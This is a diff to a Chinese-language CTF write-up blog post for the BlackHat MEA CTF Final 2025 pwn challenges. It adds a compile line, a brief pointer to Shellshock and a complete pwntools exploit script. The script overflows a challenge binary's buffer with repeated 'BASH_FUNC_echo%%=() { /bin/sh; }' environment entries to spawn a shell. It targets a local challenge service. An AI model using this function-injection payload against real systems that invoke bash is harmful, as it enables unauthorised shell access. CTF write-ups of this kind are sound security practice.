@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BlackHat MEA CTF Final 2025"
 published: 2025-12-02
-updated: 2025-12-06
+updated: 2025-12-09
 description: "Write-ups for BlackHat MEA CTF Final 2025 pwn aspect."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.2yysscpa8n.avif"
 tags: ["Pwn", "Write-ups"]
@@ -573,6 +573,8 @@ err:
 ## Write-up
 
 ```c
+// gcc -Wall -Wextra -fstack-protector-all -fcf-protection=full -mshstk -fPIE -pie -Wl,-z,relro,-z,now chall.c -o chall
+
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -584,9 +586,89 @@ int main() {
 }
 ```
 
-待复现。
+看似不可能的挑战，真的，不可能吗？[Shellshock](<https://en.wikipedia.org/wiki/Shellshock_(software_bug)>)
+
+有时间我会单独写一篇博客详撕源码，这里就只留 exp 了/逃
 
 ## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+from pwnlib.util.iters import pad
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", action="store_true")
+parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
+args = parser.parse_args()
+
+
+FILE = "./chall"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.L and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.L:
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    env = b"BASH_FUNC_echo%%=() { /bin/sh; }\0".ljust(0x30, b"\x00")
+    payload = (b"A" * 0xA + env * ((0x10148 - 0xA) // len(env))).ljust(0x10148, b"\x00")
+
+    target.sendline(payload)
+    target.recvuntil(b"Are you a good pwner?", timeout=0.5)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
 
 # Scream
 
